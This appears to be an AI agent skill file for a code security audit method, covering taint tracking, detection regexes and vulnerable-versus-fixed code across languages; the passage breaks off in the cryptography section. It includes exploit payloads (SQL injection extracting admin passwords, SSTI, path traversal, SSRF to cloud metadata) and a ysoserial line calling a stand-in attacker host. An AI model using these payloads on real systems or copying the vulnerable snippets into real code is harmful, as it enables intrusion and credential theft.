---
name: eastsword-dfyx-code-security-review
description: Expert-level code security audit skill using deep data flow analysis, taint tracking, and business logic understanding across 9 languages
triggers:
  - audit this code for security vulnerabilities
  - perform a security code review
  - find security issues in this project
  - analyze code for security flaws
  - run security audit on codebase
  - check for vulnerabilities in source code
  - conduct white-box security analysis
  - review code security with dfyx methodology
---

# EastSword DFYX Code Security Review

> Skill by [ara.so](https://ara.so) — Security Skills collection.

Expert-level code security audit skill developed by the EastSword (东方隐侠) team. Performs comprehensive white-box static analysis using a five-phase standardized audit protocol with deep data flow analysis, taint tracking, and business logic understanding.

## Overview

**dfyx_code_security_review** is a professional code security audit skill designed for AI coding agents. It employs white-box static analysis methodology through a five-phase standardized protocol to systematically discover and validate security vulnerabilities in source code.

### Core Capabilities

- **9 Languages**: Java, Python, Go, PHP, JavaScript/Node.js, C/C++, .NET/C#, Ruby, Rust
- **14 Frameworks**: Spring Boot, Django, Flask, FastAPI, Express, Koa, Gin, Laravel, Rails, ASP.NET Core, Rust Web, NestJS, Fastify, MyBatis
- **10 Security Dimensions**: Injection, Authentication, Authorization, Deserialization, File Operations, SSRF, Cryptography, Configuration, Business Logic, Supply Chain
- **Triple-Track Audit Model**: Sink-driven + Control-driven + Config-driven
- **Five-Phase Protocol**: Reconnaissance → Pattern Matching → Taint Tracking → Validation → Reporting
- **Rich Case Library**: Based on real-world WooYun vulnerability cases (2010-2016)

## Installation

Clone or copy this skill to your AI client's skills directory:

```bash
# For Claude Code
git clone https://github.com/EastSword/skill-dfyx_code_security_review.git ~/.claude/skills/eastsword-dfyx-code-security-review

# For Cursor
git clone https://github.com/EastSword/skill-dfyx_code_security_review.git ~/Library/Application\ Support/Cursor/skills/eastsword-dfyx-code-security-review

# Install Python dependencies (optional, for helper scripts)
cd ~/.claude/skills/eastsword-dfyx-code-security-review
pip install -r requirements.txt
```

## Five-Phase Audit Protocol

### Phase 1: Reconnaissance & Mapping (10%)

**Objective**: Understand architecture and identify attack surface.

```python
# Example: Architecture Analysis Output
[RECON] Technology Stack: Spring Boot 2.7.3 + MyBatis 3.5.10 + Shiro 1.9.0
[RECON] Attack Surface:
  - REST API: 47 endpoints (28 authenticated, 19 public)
  - File Upload: 3 endpoints (/api/upload, /admin/import, /user/avatar)
  - Template Engine: Thymeleaf (potential SSTI)
  - Database: MySQL 8.0.30 (84 SQL queries identified)
[RECON] Security Controls:
  - Authentication: Shiro + JWT
  - Authorization: @RequiresPermissions annotations (coverage: 67%)
  - Input Validation: @Validated + Hibernate Validator (coverage: 45%)
```

**Key Activities**:
- Identify entry points (REST endpoints, file uploads, external integrations)
- Map data flows from sources to sinks
- Enumerate security controls and their coverage
- Build architectural diagram with trust boundaries

### Phase 2: Parallel Pattern Matching (30%)

**Objective**: Identify high-risk code patterns across all dimensions.

```python
# Example: Pattern Scanner Usage
from scripts.pattern_scanner import PatternScanner

scanner = PatternScanner(language='java')
results = scanner.scan('/path/to/project', dimensions=['D1', 'D2', 'D3', 'D4', 'D5'])

# Output Example
[PATTERN] SQL Injection Candidates: 12 locations
  - UserService.java:145 - String concatenation in SQL query
  - OrderDao.xml:78 - Dynamic SQL with ${} placeholder
  
[PATTERN] Command Injection Candidates: 3 locations
  - FileProcessor.java:234 - Runtime.exec() with user input
  
[PATTERN] Authentication Bypass Candidates: 5 locations
  - AdminController.java:89 - Missing @RequiresAuthentication
  - ReportController.java:156 - Direct database authentication check
```

**Detection Rules**:

```yaml
# SQL Injection (Java)
- pattern: executeQuery\s*\(\s*[\w\s]+\s*\+
  severity: CRITICAL
  description: String concatenation in SQL query
  
- pattern: \$\{[\w\.]+\}
  file_types: [.xml]
  severity: CRITICAL
  description: MyBatis unsafe placeholder
  
# Command Injection (Python)
- pattern: os\.system\(.*input.*\)
  severity: CRITICAL
  description: User input in os.system()
  
- pattern: subprocess\.(call|run|Popen)\(.*request\.
  severity: CRITICAL
  description: User input in subprocess execution
```

### Phase 3: Deep Taint Tracking & Validation (40%)

**Objective**: Trace data flows from sources to sinks and validate exploitability.

```python
# Example: Taint Analysis
from scripts.data_flow_analyzer import TaintAnalyzer

analyzer = TaintAnalyzer()
result = analyzer.trace_flow(
    source='HttpServletRequest.getParameter("id")',
    sink='executeQuery(sql)',
    project_path='/path/to/project'
)

# Output Example
[TAINT] Flow Found: REQUEST → SQL_QUERY
  Source: UserController.java:45
    → String userId = request.getParameter("userId");
  
  Flow Path:
    1. UserController.java:45 → userId (TAINTED)
    2. UserController.java:47 → userService.getUserById(userId) (TAINTED)
    3. UserService.java:89 → buildQuery(userId) (TAINTED)
    4. UserService.java:102 → "SELECT * FROM users WHERE id=" + userId (TAINTED)
    5. UserService.java:103 → statement.executeQuery(sql) (SINK - NO SANITIZATION)
  
  Sanitization: NONE
  Validation: NONE
  Exploitable: YES
  
  POC:
    GET /api/user?userId=1' UNION SELECT password FROM admin_users--
```

**Taint Analysis Features**:

- **Source Identification**: HTTP parameters, file reads, environment variables, database queries
- **Sanitization Detection**: Input validation, encoding, parameterized queries, allowlist filtering
- **Sink Detection**: SQL execution, command execution, file operations, template rendering, JNDI lookup
- **Context-Aware Analysis**: Different rules for different contexts (SQL, OS command, XSS, etc.)

```python
# Example: Multi-Stage Taint Flow
[TAINT] Complex Flow: REQUEST → SESSION → DATABASE → TEMPLATE
  Stage 1: User input stored in session
    UserController.java:67 → session.setAttribute("theme", themeParam)
  
  Stage 2: Session value retrieved in different request
    ThemeController.java:34 → String theme = session.getAttribute("theme")
  
  Stage 3: Theme value used in database query
    ThemeService.java:89 → "SELECT * FROM themes WHERE name='" + theme + "'"
  
  Stage 4: Query result rendered in template
    theme.html:12 → <div th:text="${themeName}"></div> (XSS via SQLi)
  
  Attack Chain: Stored XSS via SQL Injection
  Exploitable: YES
```

### Phase 4: Validation & Attack Chain Construction (15%)

**Objective**: Validate vulnerabilities and construct multi-stage attack chains.

```python
# Example: Vulnerability Validation
[VALIDATION] SQL Injection in UserService.getUserById()
  
  Test 1: Syntax Error Injection
    Input: userId=1'
    Expected: SQL syntax error
    Result: ✓ "You have an error in your SQL syntax"
  
  Test 2: Boolean-based Blind SQLi
    Input: userId=1 AND 1=1
    Response Time: 0.123s
    Input: userId=1 AND 1=2
    Response Time: 0.125s
    Result: ✓ Different responses confirm vulnerability
  
  Test 3: Union-based SQLi
    Input: userId=1 UNION SELECT 1,2,3,4,5--
    Result: ✓ Column count: 5
    
  Test 4: Data Extraction
    Input: userId=1 UNION SELECT null,username,password,null,null FROM admin_users--
    Result: ✓ Admin credentials leaked

[ATTACK_CHAIN] Privilege Escalation via SQL Injection
  Step 1: Exploit SQLi to extract admin password hash
    → /api/user?userId=1 UNION SELECT password FROM admin_users WHERE role='ADMIN'--
  
  Step 2: Crack password hash (MD5 without salt)
    → hashcat -m 0 -a 0 hash.txt rockyou.txt
  
  Step 3: Login as admin
    → POST /api/login {"username":"admin","password":"cracked_password"}
  
  Step 4: Access admin panel
    → GET /admin/dashboard
  
  Impact: Complete system compromise
  Likelihood: HIGH (weak password hashing + no rate limiting)
```

**Attack Chain Patterns**:

```yaml
# Privilege Escalation Chain
chain_type: privilege_escalation
vulnerabilities:
  - SQL Injection → Password Hash Extraction
  - Weak Cryptography → Hash Cracking
  - Missing Rate Limiting → Brute Force
  - Insufficient Authorization → Admin Access

# Data Exfiltration Chain
chain_type: data_exfiltration
vulnerabilities:
  - Path Traversal → Configuration File Read
  - Hardcoded Credentials → Database Access
  - Missing Network Segmentation → Internal Network Access
  - SSRF → Cloud Metadata API Access
```

### Phase 5: Structured Reporting (5%)

**Objective**: Generate comprehensive, actionable security audit report.

```python
# Example: Report Generation
from scripts.report_generator import ReportGenerator

report = ReportGenerator()
report.add_vulnerability({
    'id': 'VUL-001',
    'title': 'SQL Injection in User Query',
    'severity': 'CRITICAL',
    'cvss': 9.8,
    'dimension': 'D1-Injection',
    'location': 'UserService.java:102',
    'description': 'String concatenation in SQL query allows SQL injection',
    'exploitation': 'Confirmed via manual testing',
    'impact': 'Complete database compromise, authentication bypass',
    'poc': 'GET /api/user?userId=1\' UNION SELECT password FROM admin_users--',
    'remediation': [
        'Use PreparedStatement with parameterized queries',
        'Implement input validation with allowlist',
        'Apply least privilege principle to database user'
    ],
    'code_vulnerable': '''
    String sql = "SELECT * FROM users WHERE id=" + userId;
    statement.executeQuery(sql);
    ''',
    'code_fixed': '''
    String sql = "SELECT * FROM users WHERE id=?";
    PreparedStatement stmt = connection.prepareStatement(sql);
    stmt.setString(1, userId);
    stmt.executeQuery();
    '''
})

report.generate('audit_report.md', format='markdown')
```

## 10 Security Dimensions

### D1: Injection Vulnerabilities

**Coverage**: SQL, Command, LDAP, SSTI, SpEL, JNDI, XSS, XXE

```python
# SQL Injection Detection
patterns = {
    'java': [
        r'executeQuery\s*\(\s*[\w\s]+\s*\+',  # String concatenation
        r'createQuery\s*\(\s*".*"\s*\+',      # JPA concatenation
        r'\$\{[\w\.]+\}'                       # MyBatis unsafe placeholder
    ],
    'python': [
        r'execute\s*\(\s*["\'].*%.*["\']',    # String formatting
        r'execute\s*\(\s*f["\'].*\{.*\}',     # f-string in SQL
        r'raw\s*\(\s*["\'].*["\'].*\+'        # Django raw query concat
    ],
    'php': [
        r'mysql_query\s*\(\s*\$',              # mysql_query with variable
        r'->query\s*\(\s*\$',                  # PDO query with variable
        r'DB::select\s*\(\s*["\'].*\.',       # Laravel string concat
    ]
}

# Command Injection Detection
patterns = {
    'java': [
        r'Runtime\.getRuntime\(\)\.exec\(',
        r'ProcessBuilder\s*\(\s*.*request',
        r'new\s+Process\w*\s*\(',
    ],
    'python': [
        r'os\.system\s*\(',
        r'subprocess\.(call|run|Popen)\(',
        r'eval\s*\(',
        r'exec\s*\(',
    ],
    'php': [
        r'exec\s*\(',
        r'shell_exec\s*\(',
        r'system\s*\(',
        r'passthru\s*\(',
        r'popen\s*\(',
        r'proc_open\s*\(',
    ]
}
```

**Example: SSTI Detection (Python)**

```python
# Vulnerable Code (Flask)
from flask import Flask, request, render_template_string

@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')
    template = '<h1>Hello ' + name + '!</h1>'
    return render_template_string(template)  # SSTI vulnerability

# Exploitation POC
# GET /hello?name={{config.items()}}
# GET /hello?name={{''.__class__.__mro__[1].__subclasses__()}}

# Fixed Code
from flask import Flask, request, render_template
from markupsafe import escape

@app.route('/hello')
def hello():
    name = escape(request.args.get('name', 'Guest'))
    return render_template('hello.html', name=name)
```

### D2: Authentication Vulnerabilities

**Coverage**: Token management, Session handling, JWT flaws, Filter chain bypass

```java
// Vulnerable: Hardcoded Credentials
public class DatabaseConfig {
    private static final String DB_USER = "admin";
    private static final String DB_PASS = "P@ssw0rd123";  // CRITICAL
    
    public Connection getConnection() {
        return DriverManager.getConnection(
            "jdbc:mysql://localhost:3306/db",
            DB_USER, DB_PASS
        );
    }
}

// Fixed: Environment Variables
public class DatabaseConfig {
    private final String dbUser = System.getenv("DB_USER");
    private final String dbPass = System.getenv("DB_PASSWORD");
    
    public Connection getConnection() {
        if (dbUser == null || dbPass == null) {
            throw new IllegalStateException("Database credentials not configured");
        }
        return DriverManager.getConnection(
            System.getenv("DB_URL"),
            dbUser, dbPass
        );
    }
}
```

**JWT Vulnerability Detection**:

```python
# Vulnerable: JWT without signature verification
import jwt

def verify_token(token):
    # CRITICAL: verify=False bypasses signature verification
    payload = jwt.decode(token, options={"verify_signature": False})
    return payload['user_id']

# Exploitation: Attacker can forge tokens
# token = jwt.encode({'user_id': 1, 'role': 'admin'}, key='anything', algorithm='HS256')

# Fixed: Proper JWT verification
import jwt
from jwt.exceptions import InvalidTokenError

def verify_token(token):
    try:
        secret_key = os.getenv('JWT_SECRET_KEY')
        payload = jwt.decode(
            token, 
            secret_key, 
            algorithms=['HS256'],
            options={"verify_signature": True}
        )
        return payload['user_id']
    except InvalidTokenError:
        raise AuthenticationError("Invalid token")
```

### D3: Authorization Vulnerabilities

**Coverage**: IDOR, Horizontal privilege escalation, Missing function-level access control, CRUD consistency

```java
// Vulnerable: IDOR (Insecure Direct Object Reference)
@GetMapping("/api/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId) {
    // No authorization check - any user can access any order
    return orderService.findById(orderId);  // CRITICAL
}

// Exploitation POC
// User A (ID=100) can access User B's order:
// GET /api/orders/999 (order belongs to User B)

// Fixed: Authorization Check
@GetMapping("/api/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId, 
                      @AuthenticationPrincipal User currentUser) {
    Order order = orderService.findById(orderId);
    
    // Verify order belongs to current user
    if (!order.getUserId().equals(currentUser.getId()) 
        && !currentUser.hasRole("ADMIN")) {
        throw new AccessDeniedException("Cannot access this order");
    }
    
    return order;
}
```

**CRUD Consistency Check**:

```python
# Detection: Find inconsistent authorization
[AUTHORIZATION] CRUD Consistency Analysis: /api/users endpoint
  
  CREATE (POST /api/users):
    ✓ @RequiresPermissions("user:create")
  
  READ (GET /api/users/{id}):
    ✗ No authorization annotation
    ✗ No ownership check in code
  
  UPDATE (PUT /api/users/{id}):
    ✓ @RequiresPermissions("user:update")
    ✗ No ownership check in code
  
  DELETE (DELETE /api/users/{id}):
    ✓ @RequiresPermissions("user:delete")
    ✓ Ownership check: if (user.getId() != currentUser.getId())
  
  Issue: READ and UPDATE lack ownership verification
  Impact: Horizontal privilege escalation
  Severity: HIGH
```

### D4: Deserialization Vulnerabilities

**Coverage**: Java Gadget chains, Python pickle, PHP unserialize

```java
// Vulnerable: Unsafe Java Deserialization
@PostMapping("/api/import")
public void importData(@RequestBody byte[] data) {
    try {
        ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(data)
        );
        Object obj = ois.readObject();  // CRITICAL: Gadget chain execution
        processData(obj);
    } catch (Exception e) {
        log.error("Import failed", e);
    }
}

// Exploitation: ysoserial gadget chain
// java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/pwned" | base64

// Fixed: Use safe serialization format
@PostMapping("/api/import")
public void importData(@RequestBody String jsonData) {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);  // Still unsafe!
    
    // Better: Use explicit DTO classes
    ImportRequest request = mapper.readValue(jsonData, ImportRequest.class);
    processData(request);
}

// Best: Whitelist deserialization
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.dto.ImportRequest",
        "java.lang.String",
        "java.util.ArrayList"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
        throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException(
                "Unauthorized deserialization attempt: " + desc.getName()
            );
        }
        return super.resolveClass(desc);
    }
}
```

### D5: File Operation Vulnerabilities

**Coverage**: Upload bypass, Path traversal, XXE, Zip slip

```python
# Vulnerable: Path Traversal
from flask import Flask, request, send_file
import os

@app.route('/download')
def download():
    filename = request.args.get('file')
    filepath = os.path.join('/var/www/uploads', filename)  # CRITICAL
    return send_file(filepath)

# Exploitation POC
# GET /download?file=../../../../etc/passwd

# Fixed: Path Traversal Prevention
from flask import Flask, request, send_file, abort
import os
from pathlib import Path

@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # Method 1: Resolve absolute path and validate
    base_dir = Path('/var/www/uploads').resolve()
    requested_path = (base_dir / filename).resolve()
    
    if not str(requested_path).startswith(str(base_dir)):
        abort(403, "Path traversal attempt detected")
    
    if not requested_path.exists() or not requested_path.is_file():
        abort(404)
    
    return send_file(requested_path)
```

**File Upload Security**:

```java
// Vulnerable: File Upload without validation
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();  // CRITICAL
    File dest = new File("/uploads/" + filename);
    file.transferTo(dest);
    return "Upload successful";
}

// Exploitation vectors:
// 1. Upload shell.php → RCE
// 2. Upload ../../../etc/passwd → Path traversal
// 3. Upload file.jsp → Web shell
// 4. Upload .htaccess → Configuration override

// Fixed: Comprehensive validation
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    // 1. Validate file size
    if (file.getSize() > 10 * 1024 * 1024) {  // 10MB limit
        throw new FileTooLargeException();
    }
    
    // 2. Validate content type
    String contentType = file.getContentType();
    List<String> allowed = Arrays.asList("image/jpeg", "image/png", "application/pdf");
    if (!allowed.contains(contentType)) {
        throw new InvalidFileTypeException();
    }
    
    // 3. Validate file extension
    String originalName = file.getOriginalFilename();
    String extension = originalName.substring(originalName.lastIndexOf("."));
    if (!Arrays.asList(".jpg", ".png", ".pdf").contains(extension.toLowerCase())) {
        throw new InvalidFileTypeException();
    }
    
    // 4. Validate magic bytes
    byte[] header = new byte[8];
    file.getInputStream().read(header);
    if (!isValidMagicBytes(header, contentType)) {
        throw new InvalidFileTypeException();
    }
    
    // 5. Generate safe filename (prevent path traversal)
    String safeFilename = UUID.randomUUID().toString() + extension;
    Path uploadDir = Paths.get("/uploads").toAbsolutePath().normalize();
    Path filePath = uploadDir.resolve(safeFilename);
    
    // 6. Verify path is within upload directory
    if (!filePath.startsWith(uploadDir)) {
        throw new SecurityException("Path traversal attempt");
    }
    
    // 7. Save file with restricted permissions
    file.transferTo(filePath.toFile());
    Files.setPosixFilePermissions(filePath, PosixFilePermissions.fromString("rw-r-----"));
    
    return "Upload successful: " + safeFilename;
}
```

### D6: SSRF Vulnerabilities

**Coverage**: URL injection, Protocol restriction bypass, Cloud metadata access

```python
# Vulnerable: SSRF via URL parameter
import requests
from flask import Flask, request

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)  # CRITICAL
    return response.text

# Exploitation POC
# GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GET /fetch?url=file:///etc/passwd
# GET /fetch?url=http://localhost:6379/  (Redis)

# Fixed: SSRF Prevention
import requests
from flask import Flask, request, abort
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = ['http', 'https']
BLOCKED_IPS = [
    '127.0.0.0/8',      # Loopback
    '10.0.0.0/8',       # Private
    '172.16.0.0/12',    # Private
    '192.168.0.0/16',   # Private
    '169.254.0.0/16',   # Link-local (AWS metadata)
    '::1/128',          # IPv6 loopback
    'fc00::/7',         # IPv6 private
]

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        
        # Validate scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False
        
        # Resolve hostname to IP
        import socket
        ip_str = socket.gethostbyname(parsed.hostname)
        ip = ipaddress.ip_address(ip_str)
        
        # Check against blocked ranges
        for blocked_range in BLOCKED_IPS:
            if ip in ipaddress.ip_network(blocked_range):
                return False
        
        # Check port (block common internal services)
        if parsed.port in [22, 23, 25, 3306, 5432, 6379, 9200, 27017]:
            return False
        
        return True
    except Exception:
        return False

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    
    if not url:
        abort(400, "URL parameter required")
    
    if not is_safe_url(url):
        abort(403, "URL not allowed")
    
    # Use timeout and size limits
    try:
        response = requests.get(
            url, 
            timeout=5,
            allow_redirects=False,  # Prevent redirect-based bypass
            stream=True
        )
        
        # Limit response size
        content = b''
        for chunk in response.iter_content(chunk_size=8192):
            content += chunk
            if len(content) > 1024 * 1024:  # 1MB limit
                abort(413, "Response too large")
        
        return content.decode('utf-8')
    except requests.exceptions.RequestException as e:
        abort(502, f"Failed to fetch URL: {str(e)}")
```

### D7: Cryptography Vulnerabilities

**Coverage**: Weak algorithms, Hard-coded keys, Improper key derivation, Insecure random

```java
// Vulnerable: Weak Cryptography
public class CryptoUtils {
    // CRITICAL: Hardcoded key
    private static final String SECRET_KEY = "MySecretKey12345";
    
    // CRITICAL: Weak algorithm (DES)
    public static String encrypt(String data) throws Exception {
        Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
        SecretKeySpec key = new SecretKeySpec(
            SECRET_KEY.getBytes(), "DES"
        );
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return Base64.getEncoder().encodeToString(
            cipher.doFinal(data.getBytes())
        );
    }
}

// Issues:
// 1. DES is broken (56-bit key)
// 2. ECB mode reveals patterns
// 3. Hardcoded key
// 4. Key derivation from string (weak entropy)

// Fixed: Strong Cryptography
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import java.util.Base64;

public class SecureCryptoUtils {
    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int KEY_SIZE = 256;
    private static final int IV_SIZE = 12;
    private static final int TAG_SIZE = 128;
    
    // Load key from environment or key management service
    private static SecretKey getKey() {
        String encodedKey = System.getenv("ENCRYPTION_KEY");
        if (encodedKey == null) {
            throw new IllegalStateException("ENCRYPTION_KEY not configured");
        }
        byte[] decodedKey = Base64.getDecoder().decode(encodedKey);
        return new SecretKeySpec(decodedKey, "AES");
    }
    
    public static String encrypt(String plaintext) throws Exception {
        SecretKey key = getKey();
        
        // Generate random IV for each encryption
        byte[] iv = new byte[IV_SIZE];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        GCMParameterSpec spec = new GCMParameterSpec(TAG_SIZE, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, spec);
        
        byte[] ciphertext = cipher.doFinal(plaintext.getBytes("UTF-8"));
        
        // Prepend IV to ciphertext
        byte[] combined = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(ciphertext, 0, combined, iv.length, ciphertext.length);
        
        return Base64.getEncoder().encodeToString(combined);
    }
    
    public static String decrypt(String encryptedData) throws Exception {
        SecretKey key = getKey();
        byte[] combined = Base64.getDecoder().decode(encryptedData);
        
        // Extract IV and ciphertext
        byte[] iv = new byte[IV_SIZE];
        byte[] ciphertext = new byte[combined.length - IV_SIZE];
        System.arraycopy(combined, 0, iv, 0, IV_SIZE);
        System.arraycopy(combined, IV_SIZE, ciphertext, 0, ciphertext.length);
        
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        GCMParameterSpec spec = new GCMParameterSpec(TAG_SIZE, iv);
        cipher.init(Cipher.DECRYPT_MODE, key, spec);
        
        byte[] plaintext = cipher.doFinal(ciphertext);
        return new String(plaintext, "UTF-8");
    }
    
    // Generate and securely store encryption key
    public static String generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(KEY_SIZE, new SecureRandom());
        Sec
